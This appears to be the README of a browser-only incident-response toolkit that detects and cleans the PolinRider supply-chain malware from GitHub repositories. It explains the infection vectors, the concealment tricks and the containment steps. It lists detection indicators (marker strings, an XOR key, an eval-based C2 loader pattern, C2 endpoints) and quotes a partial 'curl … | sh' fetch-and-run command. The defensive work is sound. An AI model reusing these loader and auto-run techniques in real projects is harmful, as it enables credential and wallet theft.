# PolinRider Recovery Toolkit

Client-side, browser-only tooling to **detect and remediate the PolinRider supply-chain malware** across your GitHub repositories.

Everything runs locally in your browser. The only network calls made are to **`https://api.github.com`** using the token you paste. Nothing is uploaded anywhere else, and the toolkit **never fetches or executes any script supplied by the malware** — all detection is done by reading file *contents* over the GitHub REST API and matching known indicators of compromise (IOCs).

---

## Contents

| File | What it is |
|------|-----------|
| `polinrider-engine.js` | **Single source of truth.** IOC signatures + all scan/restore logic, exposed as `window.PolinRider`. Both pages load it. Update IOCs here only. |
| `github-recovery-tool.html` | **Single-repo** UI — scan one repo, review infected branches, restore them (individually or all at once). |
| `fleet-scan.html` | **All-repos wizard** — discover every repo you can access, pick which to scan, scan, then pick which infected branches to fix. |

Open either `.html` file directly in a browser (keep `polinrider-engine.js` in the same folder — it's loaded via `<script src>`). Use the header nav links to switch between the two pages.

---

## The virus: PolinRider

**PolinRider** is a DPRK-linked (Lazarus / "Contagious Interview" cluster) supply-chain campaign that has compromised thousands of GitHub repositories. It plants an obfuscated JavaScript loader that auto-executes during install/build/lint/dev, pulls an encrypted second stage from blockchain/RPC dead-drops, and runs it — leading to credential, browser-data, and crypto-wallet theft (follow-on payloads include DEV#POPPER and OmniStealer).

### Infection vectors

1. **Malicious npm package** — typosquats of Tailwind/PostCSS plugins whose `postinstall` hook **appends obfuscated JS after `export default` / `module.exports`** in project config files.
2. **Fake fonts** — JS payload hidden in files like `public/fonts/fa-solid-400.woff2` (the bytes are ASCII JS, not a real font) so tooling skips them as binary assets.
3. **`.vscode` auto-run task** — a `"runOn": "folderOpen"` task in `.vscode/tasks.json` that executes the instant the project is opened in VS Code (often `curl …vercel.app/settings/<os> | sh`, or runs the fake font as a node script).
4. **Re-infection engine** — a `temp_auto_push.bat` on a compromised developer machine that re-injects the payload and force-pushes it to every reachable repo.

### Files it creates or edits

- **Config files (primary target):** `postcss.config.mjs` (most common), `tailwind.config.js`, `eslint.config.mjs`, `next.config.mjs`, `vite.config.js`, `webpack.config.js`, `vue.config.js`, `gridsome.config.js`, `astro.config.mjs`, `babel.config.js`, `App.js`, `index.js`, `truffle.js`, and similar.
- **Fake fonts:** `.woff2` / `.ttf` / `.otf` under `public/`, `static/`, `assets/`.
- **VS Code:** `.vscode/tasks.json` (`runOn: folderOpen`, `hide: true`) + `.vscode/settings.json` (`task.allowAutomaticTasks`).
- **Persistence / concealment:** `temp_auto_push.bat`, `temp_interactive_push.bat`, `config.bat`, `branch_structure.json`, plus `.gitignore` entries that hide those batch files from `git status`.
- **`package.json` / lockfiles:** injected malicious dependency (e.g. `tailwindcss-style-animate`).

### Why history looks clean

The re-infection engine **anti-dates commits**: it rewinds the system clock, runs `git commit --amend --no-verify`, then force-pushes with the original author/date/message restored. So the repo's landing page and commit history look untouched. **Commit dates are not trustworthy** — the server-side **Activity log** (force-push events with real, unspoofable timestamps) is.

### High-signal IOC markers (used by the engine)

- Marker strings `rmcej%otb%` (v1) and `Cot%3t=shtP` (v2); XOR key `2[gWfGj;<:-93Z^C`
- `global['!']=…`, `global['_V']='8-…'`, `_$_<hex>=(function…` obfuscated decoder
- `atob(process.env…)` → `node-fetch` → `eval(await …)` C2 loader
- Vercel C2 endpoints `*.vercel.app/settings/…` or `/api/…`
- Blockchain dead-drops: TRON (`api.trongrid.io`), Aptos (`fullnode.mainnet.aptoslabs.com`)
- `.vscode` `task.allowAutomaticTasks` / `"runOn":"folderOpen"`
- Fake-font detection (missing `wOF2`/`OTTO`/font magic bytes)
- Malicious npm deps and `.gitignore` concealment of the `.bat` engine

---

## ⚠️ Containment first — do this before cleaning anything

Cleaning repos is pointless until the attacker's access is cut, or the re-infection engine just re-pushes the payload.

- **Revoke all Personal Access Tokens** (deleting local copies does *not* revoke a leaked token).
- **Delete all registered SSH/GPG keys**; add fresh ones.
- **Revoke OAuth Apps + GitHub Apps** (account `settings/applications` **and** org `settings/installations`). These **survive token/SSH/password resets** and are the #1 cause of continued re-infection.
- **Sign out all sessions, reset password, verify 2FA.**
- **Rotate** CI/CD secrets, npm tokens, cloud keys, and every `.env` value.
- **Find the source machine:** search every teammate's machine for `temp_auto_push.bat` / `temp_interactive_push.bat` / `config.bat` / `branch_structure.json`. Whoever has them is the infection source — clean it and rotate that machine's credentials.
- **Every member** of affected orgs repeats the above — the injection arrives via more than one account.

The toolkit is safe to run read-only (scanning) at any time, but **hold off on fixing until credentials/grants are rotated.**

---

## Feature reference

### Shared engine (`polinrider-engine.js`)

- Reads **file contents** over the REST API and matches the IOC signature set (single source of truth).
- **Content-verified restore targets:** finds the pre-infection commit by walking the branch's **Activity log** oldest→newest to the first clean→infected transition, then confirms the candidate SHA is itself IOC-free before ever offering it.
- **Restore = force ref-update** to that verified-clean SHA. The overwritten (infected) tip stays in the Activity log, so it's **reversible**.
- Fake-font magic-byte check, malicious-npm-dependency check, `.vscode` auto-run detection, and repo-artifact (`temp_auto_push.bat`, …) flagging.
- Per-session result cache and REST rate-limit handling (surfaces a clear "resets ~HH:MM" message).

### Single-repo tool (`github-recovery-tool.html`)

- Inputs: **token, owner, repo.**
- Scans **every branch** and shows **only genuinely infected** ones, each with: matched IOC files, the current (infected) tip, and a **content-verified clean target** (or a "manual review" flag with the reason).
- Per-branch **Restore to clean SHA** button, plus a **Restore all** button that fixes every branch with a verified target in one confirmed batch (type `RESTORE ALL`).
- Safety: re-verifies the target isn't infected immediately before the force-update, re-checks the new tip afterward, blocks double-restores, and requires typing `RESTORE` to confirm.
- Flags committed **re-infection-engine artifacts** with a warning that the source machine must be cleaned.

### Fleet scanner (`fleet-scan.html`) — scan & fix across all repos

A three-step wizard:

1. **Load repositories** — enumerates every repo the token can reach. Optional **Owner / org** field restricts the list to one owner (leave blank for all). Each repo shows `private` / `fork` / `archived` / `read-only` tags, default branch, and last-pushed time. Filter box + *select all / clear / only writable*. Writable, non-archived repos are pre-selected.
2. **Scan selected** — checkbox-select which repos to scan, then scan them with a live progress bar. Clean repos/branches drop out.
3. **Review & fix** — one row per infected branch across all scanned repos, each with a checkbox. Rows are **auto-selected only when there's a verified-clean target AND you have push access**; manual-review and read-only rows are shown but disabled with the reason. **Fix selected** restores each (type `FIX ALL` to confirm) and reports a per-branch summary.

---

## Usage

1. Create a GitHub **fine-grained or classic token** with `repo` scope (read is enough to scan; **write is required to fix**). Add `workflow` scope if repos contain `.github/workflows`.
2. Open `fleet-scan.html` (all repos) or `github-recovery-tool.html` (one repo) in your browser.
3. Paste the token; optionally set an owner/org (fleet) or owner+repo (single).
4. **Scan.** Review the infected branches and their proposed clean SHAs. Click through to GitHub to inspect diffs where you want to.
5. Once containment is done, **fix** the selected branches.
6. **Re-scan** to confirm tips are clean, then move to the next owner/repo.

---

## Limitations & notes

- **Rate limits:** a fleet-wide scan makes many API calls (branches × config blobs × activity per repo). On many repos you may hit the REST limit (5,000/hr); scan in smaller batches if so.
- **Manual-review branches:** if the infection predates the Activity-log retention window, or a branch was born infected, no verified-clean target exists — the toolkit refuses to auto-restore and asks you to resolve it by hand.
- **History remains infected:** restore cleans the branch **tip**. The payload still exists deeper in git history — schedule `git filter-repo` (and rotate any secrets those repos exposed) for a full cleanup.
- **Large trees:** per-branch scanning is capped to stay under rate limits; a "clean" result on a very large repo is treated as partial and flagged.
- Fixing repos does **not** stop re-infection until credentials/OAuth grants are rotated and the `temp_auto_push.bat` machine is found (see Containment).

---

## References

- Socket — [PolinRider: North Korea-Linked Supply Chain Campaign Expands](https://socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands)
- The Hacker News — [North Korean Hackers Publish 108 Malicious Packages in PolinRider Campaign](https://thehackernews.com/2026/07/north-korean-hackers-publish-108.html)
- OpenSourceMalware — [PolinRider dossier](https://github.com/OpenSourceMalware/PolinRider)
- Security Alliance — [VS Code Tasks Abuse by Contagious Interview (DPRK)](https://radar.securityalliance.org/vs-code-tasks-abuse-by-contagious-interview-dprk/)
- Trend Micro — [Void Dokkaebi / Fake Job Interview Lure](https://www.trendmicro.com/en_us/research/26/d/void-dokkaebi-uses-fake-job-interview-lure-to-spread-malware-via-code-repositories.html)

> **Disclaimer:** This is defensive incident-response tooling. It detects and removes PolinRider from your own repositories. It does not analyze or execute malware samples.
